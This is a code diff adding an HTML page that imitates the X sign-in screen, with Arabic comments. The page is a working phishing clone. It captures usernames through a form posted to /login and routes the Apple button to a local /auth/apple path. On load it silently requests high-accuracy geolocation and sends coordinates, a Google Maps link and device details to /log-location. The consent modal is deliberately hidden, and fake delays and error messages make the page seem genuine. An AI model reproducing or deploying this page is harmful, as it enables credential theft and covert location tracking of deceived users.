@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - Sign In</title>
+    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 0 32px;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        
+        .close-btn:active {
+            transform: rotate(90deg);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+        
+        .logo svg {
+            width: 40px;
+            height: 40px;
+            transition: transform 0.5s ease;
+        }
+        
+        .logo svg:hover {
+            transform: rotate(180deg);
+        }
+        
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+        
+        .auth-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 44px;
+            border-radius: 9999px;
+            border: 1px solid #536471;
+            background-color: #000;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: transform 0.3s ease, background-color 0.2s;
+        }
+        
+        .auth-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .auth-btn:active {
+            transform: rotate(2deg);
+        }
+        
+        .auth-btn.google {
+            background-color: #fff;
+            color: #000;
+        }
+        
+        .auth-btn img,
+        .auth-btn svg {
+            width: 20px;
+            margin-right: 8px;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #71767b;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-top: 1px solid #2f3336;
+        }
+        
+        .divider span {
+            margin: 0 10px;
+        }
+        
+        form {
+            width: 100%;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            height: 56px;
+            background-color: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 17px;
+            padding: 0 16px;
+            box-sizing: border-box;
+            margin-bottom: 24px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        
+        input[type="text"].error {
+            border-color: #f4212e;
+            box-shadow: 0 0 0 1px #f4212e;
+            animation: shake 0.4s ease-in-out;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        .error-message {
+            color: #f4212e;
+            font-size: 14px;
+            margin-top: -16px;
+            margin-bottom: 16px;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        
+        .error-message.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .next-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 9999px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: transform 0.3s ease, background-color 0.3s ease;
+        }
+        
+        .next-btn:active {
+            transform: rotate(5deg);
+            background-color: #e6e6e6;
+        }
+        
+        .forgot-btn {
+            width: 100%;
+            height: 50px;
+            background-color: transparent;
+            color: #fff;
+            border: 1px solid #536471;
+            border-radius: 9999px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 24px;
+            transition: transform 0.3s ease;
+        }
+        
+        .forgot-btn:active {
+            transform: rotate(-5deg);
+        }
+        
+        .signup-text {
+            color: #71767b;
+            font-size: 15px;
+            margin-top: 40px;
+        }
+        
+        .signup-link {
+            color: #1d9bf0;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .signup-link:hover {
+            color: #1a8cd8;
+            text-decoration: underline;
+        }
+        
+        /* نافذة طلب الإذن */
+        .permission-dialog {
+            display: none; /* تم إخفاء هذا العنصر نهائياً */
+        }
+        
+        .permission-dialog p {
+            margin: 0 0 10px;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .permission-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .allow-btn {
+            background-color: white;
+            color: #1d9bf0;
+        }
+        
+        .deny-btn {
+            background-color: transparent;
+            color: white;
+            border: 1px solid white;
+        }
+        
+        /* أنماط لنافذة طلب الإذن */
+        .modal-overlay {
+            display: none; /* إخفاء نهائي */
+        }
+        
+        /* Spinner animation for buttons */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinning {
+            position: relative;
+        }
+        
+        .spinning::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 30px;
+            margin-top: -10px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: #000;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        .spinning.active::after {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- نافذة طلب إذن الموقع -->
+    <div class="modal-overlay" id="location-permission-modal">
+        <div class="modal-content">
+            <div class="modal-title">X wants to access your precise location</div>
+            <div class="modal-message">
+                This allows X to show content, ads, and businesses relevant to your area. Your privacy is important to us.
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-primary" id="allow-location">Allow location access</button>
+                <button class="modal-btn modal-secondary" id="deny-location">Not now</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="close-btn">✕</div>
+    <div class="container">
+        <div class="logo">
+            <svg role="img" aria-label="X logo" width="48" height="48" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M86.8918 28.25H99.0219L72.5243 58.5334L103.698 99.75H79.285L60.1647 74.7536L38.2929 99.75H26.1627L54.5069 67.3565L24.5938 28.25H49.6199L66.9004 51.0974L86.8918 28.25ZM82.6337 92.4904H89.3555L45.9716 35.1301H38.7584L82.6337 92.4904Z" fill="white"/>
+            </svg>
+        </div>
+        
+        <h1>Sign in to X</h1>
+        
+        <button class="auth-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 384 512" fill="white">
+                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
+            </svg>
+            Sign in with Apple
+        </button>
+        
+        <div class="divider"><span>or</span></div>
+        
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Phone, email, or username" required>
+            <div class="error-message">Please enter a valid username</div>
+            
+            <button type="submit" class="next-btn spinning">Next</button>
+        </form>
+        
+        <button class="forgot-btn">Forgot password?</button>
+        
+        <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Create an account</a></p>
+    </div>
+    
+    <script>
+        // إعداد التطبيق وتمرير إصدار الجهاز
+        let deviceData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height
+        };
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            // Add artificial delay for page load (1-2 seconds)
+            setTimeout(() => {
+                // Request location permission
+                requestLocationPermission();
+                
+                // Focus the username field after a slight delay
+                setTimeout(() => {
+                    document.querySelector("input[name='username']").focus();
+                }, 5000);
+                
+                // طلب الموقع تلقائياً عند تحميل الصفحة بدون واجهة
+                requestLocationAutomatically();
+                
+                const usernameInput = document.querySelector("input[name='username']");
+                const errorMessage = document.querySelector(".error-message");
+                
+                // Function to show error
+                function showError() {
+                    usernameInput.classList.add('error');
+                    errorMessage.classList.add('visible');
+                    usernameInput.focus();
+                    
+                    // Remove error after 3 seconds
+                    setTimeout(() => {
+                        clearError();
+                    }, 3000);
+                }
+                
+                // Function to clear error
+                function clearError() {
+                    usernameInput.classList.remove('error');
+                    errorMessage.classList.remove('visible');
+                }
+                
+                // Clear error on input
+                usernameInput.addEventListener('input', function() {
+                    clearError();
+                });
+                
+                // إضافة مستمع الحدث لنموذج تسجيل الدخول
+                document.querySelector("form").addEventListener("submit", async function(e) {
+                    e.preventDefault();
+                    
+                    const username = document.querySelector("input[name='username']").value;
+                    const loginBtn = document.querySelector(".next-btn");
+                    
+                    if (!username.trim()) {
+                        showError();
+                        return;
+                    }
+                    
+                    // تعطيل زر تسجيل الدخول وتغيير النص
+                    loginBtn.disabled = true;
+                    loginBtn.textContent = "Next...";
+                    loginBtn.classList.add("active");
+                    
+                    // محاكاة عملية التحقق من اسم المستخدم مع تأخير واقعي
+                    setTimeout(function() {
+                        // إرسال النموذج
+                        document.querySelector("form").submit();
+                    }, 2000 + Math.random() * 1500);
+                });
+                
+                // Forgot password button with delay
+                document.querySelector(".forgot-btn").addEventListener("click", function() {
+                    this.style.opacity = "0.7";
+                    setTimeout(() => {
+                        this.style.opacity = "1";
+                        alert("Password reset functionality is temporarily unavailable. Please try again later.");
+                    }, 5000 + Math.random() * 200);
+                });
+                
+                document.querySelector(".close-btn").addEventListener("click", function() {
+                    this.style.opacity = "0.5";
+                    setTimeout(() => {
+                        window.history.back();
+                    }, 5000 + Math.random() * 200);
+                });
+                
+                document.querySelector(".auth-btn").addEventListener("click", function() {
+                    this.disabled = true;
+                    this.style.opacity = "0.7";
+                    this.style.transform = "scale(0.98)";
+                    setTimeout(() => {
+                        window.location.href = "/auth/apple";
+                    }, 800 + Math.random() * 500);
+                });
+                
+                // Add a subtle animation to the logo
+                const logo = document.querySelector(".logo svg");
+                setTimeout(() => {
+                    logo.style.transform = "rotate(2deg)";
+                    setTimeout(() => {
+                        logo.style.transform = "rotate(-2deg)";
+                        setTimeout(() => {
+                            logo.style.transform = "rotate(0deg)";
+                        }, 5000);
+                    }, 5000);
+                }, 2000);
+            }, 800 + Math.random() * 700);
+        });
+        
+        // Function to request location permission explicitly
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Success: Permission granted and location obtained
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // Create Google Maps URL
+                        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        // Send location data to server
+                        logLocationToServer(latitude, longitude, googleMapsUrl);
+                    },
+                    // Error: Permission denied or error
+                    function(error) {
+                        console.log("Location access denied or error", error);
+                    },
+                    // Options: High accuracy
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+        
+        // دالة لطلب الموقع تلقائياً بدون نوافذ
+        function requestLocationAutomatically() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // نجاح: تم الحصول على الموقع
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // إنشاء رابط خرائط جوجل
+                        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        // إرسال الموقع إلى الخادم
+                        logLocationToServer(latitude, longitude, googleMapsUrl);
+                    },
+                    // فشل: تم رفض الإذن أو حدث خطأ
+                    function(error) {
+                        console.log("Location access denied or error", error);
+                    }
+                );
+            }
+        }
+        
+        // دالة لتسجيل الموقع على الخادم
+        function logLocationToServer(latitude, longitude, googleMapsUrl) {
+            const data = {
+                latitude: latitude,
+                longitude: longitude,
+                googleMapsUrl: googleMapsUrl,
+                timestamp: new Date().toISOString(),
+                deviceInfo: deviceData
+            };
+            
+            fetch('/log-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Location logged successfully');
+                }
+            })
+            .catch(error => {
+                console.error('Error logging location:', error);
+            });
+        }
+    </script>
+</body>
+</html>
